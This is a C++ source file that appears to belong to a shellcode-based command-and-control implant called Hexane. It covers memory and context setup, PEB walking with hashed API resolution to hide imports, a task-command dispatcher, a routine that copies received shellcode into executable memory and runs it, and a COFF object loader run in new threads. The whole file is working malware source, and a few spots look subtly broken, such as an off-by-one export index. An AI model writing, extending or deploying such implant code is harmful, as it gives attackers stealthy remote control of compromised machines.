#include <core/include/memory.hpp>
namespace Memory {

    namespace Methods {

        UINT_PTR GetStackCookie() {

            uintptr_t cookie = 0;
            x_ntassert(Ctx->nt.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) 0x24, &cookie, 0x4, nullptr));

            defer:
            return cookie;
        }

        _resource* GetIntResource(HMODULE base, const int rsrc_id) {

            HRSRC res_info      = { };
            _resource *object   = (_resource*) x_malloc(sizeof(_resource));

            x_assert(res_info          = Ctx->win32.FindResourceA(base, MAKEINTRESOURCE(rsrc_id), RT_RCDATA));
            x_assert(object->h_global  = Ctx->win32.LoadResource(base, res_info));
            x_assert(object->size      = Ctx->win32.SizeofResource(base, res_info));
            x_assert(object->res_lock  = Ctx->win32.LockResource(object->h_global));

        defer:
            return object;
        }

        _executable* CreateImageData(uint8_t *data) {

            _executable *image = (_executable*) x_malloc(sizeof(_executable));

            image->buffer   = data;
            image->dos_head = (PIMAGE_DOS_HEADER) image->buffer;
            image->nt_head  = (PIMAGE_NT_HEADERS) (B_PTR(data) + ((PIMAGE_DOS_HEADER) image->buffer)->e_lfanew);
            image->exports  = (PIMAGE_EXPORT_DIRECTORY) B_PTR(image->buffer) + image->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
            image->symbol   = (_coff_symbol*) image->buffer + image->nt_head->FileHeader.PointerToSymbolTable;

            return image;
        }
    }

    namespace Context {

        VOID ContextInit() {
            // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/

            _hexane instance    = { };
            void *region        = { };

            instance.teb    = NtCurrentTeb();
            instance.heap   = instance.teb->ProcessEnvironmentBlock->ProcessHeap;

            instance.teb->LastErrorValue    = ERROR_SUCCESS;
            instance.base.address           = U_PTR(InstStart());
            instance.base.size              = U_PTR(InstEnd()) - instance.base.address;

            x_assert(instance.modules.ntdll = M_PTR(NTDLL));
            x_assert(F_PTR_HMOD(instance.nt.RtlAllocateHeap, instance.modules.ntdll, RTLALLOCATEHEAP));

            region = RVA(PBYTE, instance.base.address, &__instance);
            x_assert(C_DREF(region) = instance.nt.RtlAllocateHeap(instance.heap, HEAP_ZERO_MEMORY, sizeof(_hexane)));

            x_memcpy(C_DREF(region), &instance, sizeof(_hexane));
            x_memset(&instance, 0, sizeof(_hexane));
            x_memset(RVA(PBYTE, region, sizeof(LPVOID)), 0, 0xE);

        defer:
        }

        VOID ContextDestroy() {
            // todo: ContextDestroy needs expanded to destroy all strings (http/smb context + anything else)

            auto free = Ctx->nt.RtlFreeHeap;
            auto heap = Ctx->heap;

            x_memset(Ctx, 0, sizeof(_hexane));

            if (free) {
                free(heap, 0, Ctx);
            }
        }
    }


    namespace Modules {

        HMODULE GetModuleAddress(const LDR_DATA_TABLE_ENTRY *data) {
            return (HMODULE) data->DllBase;
        }

        LDR_DATA_TABLE_ENTRY* GetModuleEntry(const uint32_t hash) {

            LIST_ENTRY *head = &(PEB_POINTER)->Ldr->InMemoryOrderModuleList;

            for (auto next = head->Flink; next != head; next = next->Flink) {
                const auto mod  = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
                const auto name = mod->BaseDllName;

                wchar_t buffer[MAX_PATH] = { };

                if (hash - Utils::HashStringW(x_wcs_tolower(buffer, name.Buffer), x_wcslen(name.Buffer)) == 0) {
                    return mod;
                }
            }

            return nullptr;
        }

        FARPROC GetExportAddress(const void *base, const uint32_t hash) {

            FARPROC address = nullptr;

            const auto nt_head = (PIMAGE_NT_HEADERS) (B_PTR(base) + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
            const auto exports = (PIMAGE_EXPORT_DIRECTORY) (B_PTR(base) + nt_head->OptionalHeader.DataDirectory[0].VirtualAddress);

            if (nt_head->Signature != IMAGE_NT_SIGNATURE) {
                return address;
            }

            for (auto index = 0; index < exports->NumberOfNames; index++) {
                const auto name = (char*) (base + ((uint32_t*)(base + exports->AddressOfNames))[index-1]);

                char buffer[MAX_PATH] = { };

                if (hash - Utils::HashStringA(x_mbs_tolower(buffer, name), x_strlen(name)) == 0) {
                    address = (FARPROC) (base + ((uint32_t*)(base + exports->AddressOfFunctions))[index]);
                    break;
                }
            }

            return address;
        }

        UINT_PTR LoadExport(const char* const module_name, const char* const export_name) {

            uintptr_t symbol    = 0;
            int reload          = 0;

            char buffer[MAX_PATH] = { };

            const auto mod_hash = Utils::HashStringA(x_mbs_tolower(buffer, module_name), x_strlen(module_name));
            const auto fn_hash  = Utils::HashStringA(x_mbs_tolower(buffer, export_name), x_strlen(export_name));

            while (!symbol) {
                if (!(F_PTR_HASHES(symbol, mod_hash, fn_hash))) {
                    if (reload || !Ctx->win32.LoadLibraryA((const char*) module_name)) {
                        goto defer;
                    }

                    reload = 1;
                }
            }

            defer:
            return symbol;
        }
    }

    namespace Execute {
        BOOL ExecuteCommand(_parser& parser) {
            _command cmd = {};
            uintptr_t command = {};

            const auto cmd_id = Parser::UnpackDword(&parser);
            bool success = true;

            if (cmd_id == NOJOB) {
                goto defer;
            }

            x_assertb(command = Commands::GetCommandAddress(cmd_id));

            cmd = (_command)RVA(PBYTE, Ctx->base.address, command);
            cmd(&parser);

        defer:
            return success;
        }

        BOOL ExecuteShellcode(const _parser& parser) {
            void (*exec)() = {};
            void* address = {};

            size_t size = parser.Length;
            bool success = true;

            x_ntassertb(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

            x_memcpy(address, parser.buffer, parser.Length);
            x_ntassertb(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr));

            exec = (void(*)())address;
            exec();

            x_memset(address, 0, size);

        defer:
            if (address) { Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE); }
            return success;
        }

        VOID LoadObject(_parser parser) {
            // todo: maybe loadable objects in remote processes??

            _injection_ctx inject = {};
            _coff_params* params = (_coff_params*)x_malloc(sizeof(_coff_params));

            params->entrypoint  = Parser::UnpackString(&parser, (uint32_t*)&params->entrypoint_size);
            params->data        = Parser::UnpackBytes(&parser, (uint32_t*)&params->data_size);
            params->args        = Parser::UnpackBytes(&parser, (uint32_t*)&params->args_size);
            params->cache       = Parser::UnpackBool(&parser);
            params->task_id     = Ctx->session.current_taskid;

            inject.parameter = params;
            Ctx->threads++;

            if (!Threads::CreateUserThread(NtCurrentProcess(), true, (void*)Objects::CoffThread, params, nullptr)) {
                // get error
            }
        }
    }
}
